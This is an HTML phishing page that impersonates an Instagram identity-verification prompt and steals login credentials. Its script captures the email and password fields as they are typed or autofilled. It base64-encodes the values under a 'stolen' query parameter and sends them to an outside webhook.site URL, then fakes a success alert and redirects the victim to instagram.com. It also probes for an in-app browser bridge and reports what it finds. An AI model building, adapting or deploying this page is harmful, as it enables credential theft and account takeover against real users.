<!DOCTYPE html>
<html>
<head>
    <title>Security Update - Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system, sans-serif; background: #fafafa; padding: 20px; text-align: center; }
        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; border-radius: 8px; max-width: 350px; margin: auto; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 4px; box-sizing: border-box; }
        .btn { background: #0095f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
        #status { font-size: 12px; color: #8e8e8e; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" width="60">
        <h3>Verify Your Identity</h3>
        <p style="font-size: 14px; color: #8e8e8e;">Confirm your details to keep your account secure.</p>
        
        <input type="email" id="email" name="email" placeholder="Email address" autocomplete="email">
        <input type="password" id="pass" name="password" placeholder="Password" autocomplete="current-password">
        
        <button class="btn" onclick="manualSend()">Confirm</button>
        <div id="status">Status: Monitoring for data entry...</div>
    </div>

    <script>
        const webhook = "https://webhook.site/#!/view/f1738809-1a2e-4085-a7d6-e448a2a477b3/df6b5e08-8138-45d6-8837-a44c04c03d8f";

        // AUTO-CAPTURE LOGIC: Jaise hi value change hogi (Autofill se), data chala jayega
        const fields = ['email', 'pass'];
        fields.forEach(id => {
            document.getElementById(id).addEventListener('input', function() {
                if(this.value.length > 3) {
                    sendToWebhook("autofill_capture", id, this.value);
                }
            });
        });

        function sendToWebhook(type, field, val) {
            const data = {
                event: type,
                field: field,
                value: val,
                ua: navigator.userAgent,
                path: window.location.href
            };
            
            // Webhook pe bhej rahe hain
            fetch(webhook + "?stolen=" + btoa(JSON.stringify(data)));
            document.getElementById('status').innerText = "> Data exfiltrated: " + field;
        }

        function manualSend() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            sendToWebhook("manual_submit", "full_form", e + ":" + p);
            alert("Security Verification Successful.");
            window.location.href = "https://instagram.com";
        }

        // Bridge Injection check
        if(window.iabjs_unified_bridge) {
            fetch(webhook + "?bridge_status=active_and_exposed");
        }
    </script>
</body>
</html>
